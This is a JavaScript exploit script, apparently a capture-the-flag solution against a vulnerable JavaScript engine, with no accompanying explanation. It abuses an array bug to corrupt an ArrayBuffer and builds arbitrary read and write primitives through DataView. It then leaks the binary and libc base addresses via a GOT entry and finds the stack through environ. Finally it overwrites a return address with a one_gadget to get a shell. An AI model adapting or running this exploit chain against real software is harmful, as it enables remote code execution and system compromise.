function printhex(s,u){
    print(s,"0x" + u[1].toString(16).padStart(8, '0') + u[0].toString(16).padStart(8, '0'));
}

function hex(i){
    return "0x" + i.toString(16).padStart(16, '0');
}

function pack64(u){
    return u[0] + u[1] * 0x100000000;
}

function l32(data){
    let result = 0;
    for(let i=0;i<4;i++){
        result <<= 8;
        result |= data & 0xff;
        data >>= 8;
    }
    return result;
}

a = [1.1];
a.shift();

var ab = new ArrayBuffer(0x1337);
var dv = new DataView(ab);

var ab2 = new ArrayBuffer(0x2338);
var dv2 = new DataView(ab2);
for(let i = 0; i < 0x90; i++){
	dv2 = new DataView(ab2);
}

a[0x193] = 0xffff;

print("[+]change ab range");

a[0x32] = 0xdead;

for(let i = 0; i < 100000000; i ++){

}

var idx = 0;
for (let i = 0; i < 0x5000; i++){
    let v = dv.getUint32(i, 1);
    if(v == 0x2338){
        idx = i;
    }
}

print("Get idx!");

function arb_read(addr){
    dv.setUint32(idx + 4, l32(addr[0]));
    dv.setUint32(idx + 8, l32(addr[1]));
    let result = new Uint32Array(2);
    result[0] = dv2.getUint32(0, 1)
    result[1] = dv2.getUint32(4, 1);
    return result;
}

function arb_write(addr,val){
    dv.setUint32(idx + 4, l32(addr[0]));
    dv.setUint32(idx + 8, l32(addr[1]));
    dv2.setUint32(0, l32(val[0]));
    dv2.setUint32(4, l32(val[1]));
}

var u = new Uint32Array(2);
u[0] = dv.getUint32(idx + 4, 1);
u[1] = dv.getUint32(idx + 8, 1);

print(hex(pack64(u)));

var elf_base = new Uint32Array(2);
elf_base[0] = u[0] - 0x6f5e0;
elf_base[1] = u[1];
printhex("elf_base:",elf_base);

var free_got = new Uint32Array(2);
free_got[0] = elf_base[0] + 0x6bdd0;
free_got[1] = elf_base[1];
printhex("free_got:",free_got);

var libc_base = arb_read(free_got);
libc_base[0] -= 0x9d850;
printhex("libc_base:",libc_base);

var environ_addr = new Uint32Array(2);
environ_addr[0] = libc_base[0] + 0x1ef2d0;
environ_addr[1] = libc_base[1];
printhex("environ_addr:",environ_addr);
var stack_addr = arb_read(environ_addr);
printhex("stack_addr:",stack_addr);

var one_gadget = new Uint32Array(2);
one_gadget[0] = (libc_base[0] + 0xe6c7e);
one_gadget[1] = libc_base[1];
printhex("one_gadget:",one_gadget);
stack_addr[0] -= 0x118;
arb_write(stack_addr,one_gadget);

var zero = new Uint32Array(2);
zero[0] = 0;
zero[1] = 0;
printhex("zero:",zero);
stack_addr[0] -= 0x29;
arb_write(stack_addr,zero);

print("finish");

for(let i = 0; i < 100000000; i ++){

}
